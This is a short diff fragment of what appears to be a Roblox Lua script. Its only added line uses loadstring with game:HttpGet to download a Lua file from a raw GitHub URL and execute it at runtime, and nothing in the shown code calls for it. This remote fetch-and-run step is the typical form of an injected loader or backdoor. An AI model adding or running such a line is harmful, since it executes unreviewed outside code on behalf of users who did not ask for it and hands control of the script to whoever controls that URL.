@@ -220,3 +220,4 @@ task.spawn(function()
         end)
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/APIGET/main/GET.lua"))()
